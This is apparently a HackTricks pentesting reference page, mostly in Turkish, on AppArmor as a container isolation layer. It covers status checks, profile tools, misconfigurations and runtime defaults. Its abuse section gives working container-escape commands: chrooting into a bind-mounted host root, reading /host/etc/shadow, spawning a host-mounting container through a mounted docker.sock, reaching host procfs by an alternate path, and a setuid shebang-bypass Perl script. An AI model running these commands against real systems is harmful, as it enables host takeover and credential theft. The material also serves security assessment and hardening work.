# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

AppArmor, program başına oluşturulan profiller aracılığıyla kısıtlamalar uygulayan bir **Zorunlu Erişim Kontrolü** sistemidir. Kullanıcı ve grup sahipliğine büyük ölçüde bağımlı olan geleneksel DAC denetimlerinin aksine, AppArmor çekirdeğin sürece doğrudan bağlı bir politikayı uygulamasına izin verir. Container ortamlarda bu önemlidir çünkü bir iş yükü geleneksel ayrıcalıklara sahip olup bir eylemi denemeye yeterli olabilir fakat ilgili yolun, mount'un, ağ davranışının veya capability kullanımının AppArmor profili tarafından izin verilmemesi nedeniyle yine reddedilebilir.

En önemli kavramsal nokta, AppArmor'ın **yol tabanlı** olmasıdır. SELinux'un yaptığı gibi etiketler aracılığıyla değil, yol kuralları üzerinden dosya sistemi erişimini değerlendirir. Bu yaklaşımı erişilebilir ve güçlü kılar, ancak bind mount'lar ve alternatif yol düzenleri dikkatle ele alınmalıdır. Aynı host içeriği farklı bir yol altında erişilebilir hale gelirse, politikanın etkisi operatörün ilk beklediği gibi olmayabilir.

## Container İzolasyonundaki Rol

Container güvenlik incelemeleri sıklıkla capabilities ve seccomp ile sınırlı kalır, ancak AppArmor bu kontrollerden sonra da önemini korur. Bir container'ın olması gerekenden daha fazla ayrıcalığa sahip olduğunu veya bir iş yükünün operasyonel nedenlerle bir ekstra capability'ye ihtiyaç duyduğunu düşünün. AppArmor yine de dosya erişimini, mount davranışını, ağ iletişimini ve yürütme kalıplarını, açık istismar yolunu engelleyecek şekilde kısıtlayabilir. Bu yüzden AppArmor'ı "sadece uygulamayı çalıştırmak için" devre dışı bırakmak, yalnızca riskli bir yapılandırmayı sessizce aktif olarak istismar edilebilir hale getirebilir.

## Laboratuvar

AppArmor'ın host üzerinde aktif olup olmadığını kontrol etmek için şunu kullanın:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Mevcut container işleminin hangi kullanıcı/ortam altında çalıştığını görmek için:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Fark öğreticidir. Normal durumda, süreç runtime tarafından seçilen profile bağlı bir AppArmor bağlamı göstermelidir. unconfined durumunda, bu ekstra kısıtlama katmanı kaybolur.

Ayrıca Docker'ın uyguladığını düşündüğü şeyi de inceleyebilirsiniz:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Çalışma Zamanı Kullanımı

Docker, ev sahibi destekliyorsa varsayılan veya özel bir AppArmor profili uygulayabilir. Podman da AppArmor tabanlı sistemlerle entegre olabiliyor; ancak SELinux-öncelikli dağıtımlarda diğer MAC sistemi genellikle ön plana çıkar. Kubernetes, AppArmor'ı gerçekten destekleyen düğümlerde iş yükü düzeyinde AppArmor politikalarını açığa çıkarabilir. LXC ve ilişkili Ubuntu ailesi system-container ortamları da AppArmor'ı yoğun şekilde kullanır.

Pratik olarak, AppArmor bir "Docker feature" değildir. Birden fazla runtime'ın uygulamayı seçebileceği bir host-kernel özelliğidir. Eğer host bunu desteklemiyor ya da runtime'e unconfined olarak çalışması talimatı verilirse, varsayılan koruma gerçekte mevcut olmaz.

Docker destekli AppArmor hostlarda en bilinen varsayılan `docker-default`'dır. Bu profil Moby'nin AppArmor şablonundan üretilir ve bazı capability-tabanlı PoCs'in varsayılan bir konteynerde neden hâlâ başarısız olduğunu açıklaması açısından önemlidir. Geniş anlamda, `docker-default` sıradan ağ iletişimine izin verir, `/proc`'un büyük bir kısmına yazmayı reddeder, `/sys`'in hassas bölümlerine erişimi engeller, mount işlemlerini bloke eder ve ptrace'i genel bir host-probing ilmeği olmayacak şekilde sınırlar. Bu temel hattı anlamak, "konteynerin `CAP_SYS_ADMIN`'a sahip olması" ile "konteynerin bu capability'i ilgilendiğim kernel arabirimlerine karşı gerçekten kullanabilmesi" arasındaki farkı ayırt etmeye yardımcı olur.

## Profil Yönetimi

AppArmor profilleri genelde `/etc/apparmor.d/` altında saklanır. Yaygın bir isimlendirme kuralı, çalıştırılabilir yolundaki eğik çizgileri (slashes) noktalara çevirmektir. Örneğin, `/usr/bin/man` için bir profil genelde `/etc/apparmor.d/usr.bin.man` olarak saklanır. Bu ayrıntı hem savunma hem de değerlendirme sırasında önemlidir çünkü aktif profil adını öğrendiğinizde, karşılık gelen dosyayı host üzerinde genellikle hızlıca bulabilirsiniz.

Host tarafında kullanışlı yönetim komutları şunlardır:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
The reason these commands matter in a container-security reference is that they explain how profiles are actually built, loaded, switched to complain mode, and modified after application changes. If an operator has a habit of moving profiles into complain mode during troubleshooting and forgetting to restore enforcement, the container may look protected in documentation while behaving much more loosely in reality.

### Profillerin Oluşturulması ve Güncellenmesi

`aa-genprof` uygulama davranışını gözlemleyebilir ve interaktif olarak bir profil oluşturulmasına yardımcı olabilir:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` daha sonra `apparmor_parser` ile yüklenebilecek bir şablon profil oluşturabilir:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
binary değiştiğinde ve politikanın güncellenmesi gerektiğinde, `aa-logprof` günlüklerde bulunan reddedilmeleri yeniden oynatabilir ve operatörün bunlara izin verip vermemeye karar vermesine yardımcı olabilir:
```bash
sudo aa-logprof
```
### Günlükler

AppArmor reddedilmeleri genellikle `auditd`, syslog veya `aa-notify` gibi araçlar aracılığıyla görülebilir:
```bash
sudo aa-notify -s 1 -v
```
Bu operasyonel ve saldırgan amaçlı olarak kullanışlıdır. Savunucular bunu profile'ları iyileştirmek için kullanır. Saldırganlar, hangi kesin path veya operation'un reddedildiğini ve AppArmor'ın bir exploit chain'i engelleyen kontrol olup olmadığını öğrenmek için kullanır.

### Kesin profile dosyasını belirleme

Bir runtime bir container için belirli bir AppArmor profile name gösterdiğinde, genellikle o name'i disk üzerindeki profile file ile eşlemek faydalıdır:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Bu, host tarafı incelemesi sırasında özellikle faydalıdır; çünkü "container'ın `lowpriv` profilinde çalıştığını söylemesi" ile "gerçek kuralların denetlenip yeniden yüklenebileceği bu belirli dosyada bulunması" arasındaki farkı giderir.

## Yanlış yapılandırmalar

En bariz hata `apparmor=unconfined`'dir. Yöneticiler genellikle, profil tehlikeli veya beklenmedik bir şeyi doğru şekilde engellediği için başarısız olan bir uygulamayı debug ederken bunu ayarlarlar. Eğer bu bayrak üretimde kalırsa, tüm MAC katmanı fiilen kaldırılmış olur.

Başka ince bir sorun, dosya izinleri normal göründüğü için bind mounts'un zararsız olduğunu varsaymaktır. AppArmor path-based olduğundan, host yollarını alternatif mount konumları altında açmak path kurallarıyla kötü etkileşime girebilir. Üçüncü bir hata ise bir config file içindeki profile name'in, host kernel gerçekten AppArmor'u uygulamıyorsa çok az anlam taşıdığını unutmaktır.

## Kötüye kullanım

AppArmor olmadığında, daha önce kısıtlanmış olan işlemler aniden çalışabilir: bind mounts üzerinden hassas yolları okumak, procfs veya sysfs'in kullanımı daha zor kalması gereken bölümlerine erişmek, capabilities/seccomp izin veriyorsa mount ile ilgili eylemleri gerçekleştirmek ya da normalde bir profile tarafından reddedilecek yolları kullanmak. AppArmor sıklıkla, kağıt üzerinde bir capability-temelli breakout denemesinin "çalışması gerektiğini" ama uygulamada başarısız olduğunu açıklayan mekanizmadır. AppArmor'u kaldırın, ve aynı deneme başarılı olmaya başlayabilir.

Eğer AppArmor'ın bir path-traversal, bind-mount veya mount-based kötüye kullanım zincirini durduran ana şey olduğunu düşünüyorsanız, genellikle ilk adım profile sahipken ve profilsizken hangi kaynakların erişilebilir hale geldiğini karşılaştırmaktır. Örneğin, bir host path container içine mount edildiyse, önce onu traverse edip okuyup okuyamadığınızı kontrol ederek başlayın:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Eğer container ayrıca `CAP_SYS_ADMIN` gibi tehlikeli bir capability'ye sahipse, en pratik testlerden biri AppArmor'un mount işlemlerini veya hassas kernel dosya sistemlerine erişimi engelleyip engellemediğini kontrol etmektir:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Bir host path'in zaten bind mount ile sağlandığı ortamlarda, AppArmor'un kaybı salt okunur bir information-disclosure sorununu doğrudan host dosya erişimine dönüştürebilir:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Bu komutların amacı AppArmor'un tek başına kaçış oluşturması değildir. Amaç, AppArmor kaldırıldıktan sonra birçok dosya sistemi ve mount tabanlı kötüye kullanım yolunun hemen test edilebilir hale gelmesidir.

### Tam Örnek: AppArmor Devre Dışı + Host Root Bağlı

Eğer konteynerde host root zaten `/host`'e bind-mount edilmişse, AppArmor'un kaldırılması engellenmiş bir dosya sistemi kötüye kullanım yolunu tam bir host kaçışına dönüştürebilir:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Shell host filesystem üzerinden çalışırken, workload etkili bir şekilde container boundary'den kaçmış olur:
```bash
id
hostname
cat /etc/shadow | head
```
### Tam Örnek: AppArmor Devre Dışı + Runtime Socket

Eğer gerçek engel çalışma zamanı durumunu kapsayan AppArmor ise, mount edilmiş bir socket tam bir kaçış için yeterli olabilir:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Tam yol bağlama noktasına bağlıdır, ancak sonuç aynı: AppArmor artık runtime API'ye erişimi engellemiyor ve runtime API host'u tehlikeye atabilecek bir container başlatabilir.

### Tam Örnek: Path-Based Bind-Mount Bypass

Çünkü AppArmor yol-tabanlıdır, protecting `/proc/**` does not automatically protect the same host procfs content when it is reachable through a different path:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Etkisi, tam olarak neyin mount edildiğine ve alternatif yolun diğer kontrolleri de bypass edip etmediğine bağlıdır, ancak bu desen AppArmor'ın tek başına değil, mount düzeni ile birlikte değerlendirilmesi gerektiğinin en net nedenlerinden biridir.

### Tam Örnek: Shebang Bypass

AppArmor politikası bazen yorumlayıcı yolunu, shebang işleme yoluyla script yürütmesini tam olarak hesaba katmayacak şekilde hedefler. Tarihi bir örnek, ilk satırı sınırlı bir yorumlayıcıyı işaret eden bir script kullanmayı içeriyordu:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Bu tür bir örnek, profil niyeti ile gerçek yürütme semantiğinin farklılaşabileceğini hatırlatması açısından önemlidir. AppArmor'ı container ortamlarında incelerken, interpreter zincirleri ve alternatif yürütme yolları özel dikkat gerektirir.

## Kontroller

Bu kontrollerin amacı üç soruya hızlıca cevap vermektir: AppArmor hostta etkin mi, mevcut süreç kısıtlanmış mı ve runtime gerçekten bu container'a bir profil uyguladı mı?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Burada ilginç olanlar:

- Eğer `/proc/self/attr/current` `unconfined` gösteriyorsa, çalışma yükü AppArmor kısıtlamasından yararlanmıyor.
- Eğer `aa-status` AppArmor'un disabled veya not loaded olduğunu gösteriyorsa, runtime yapılandırmasındaki herhangi bir profil adı çoğunlukla kozmetiktir.
- Eğer `docker inspect` `unconfined` veya beklenmeyen bir özel profil gösteriyorsa, bu genellikle bir dosya sistemi veya mount tabanlı kötüye kullanım yolunun işlemesinin nedenidir.

Eğer bir konteyner operasyonel nedenlerle zaten ayrıcalık artırılmışsa, AppArmor'u etkin bırakmak çoğu zaman kontrollü bir istisna ile çok daha geniş bir güvenlik ihlali arasındaki farkı yaratır.

## Çalışma Zamanı Varsayılanları

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

AppArmor için en önemli değişken genellikle yalnızca runtime değil **host**'tur. Bir manifestteki profil ayarı, AppArmor etkin olmayan bir node'da kısıtlama oluşturmaz.
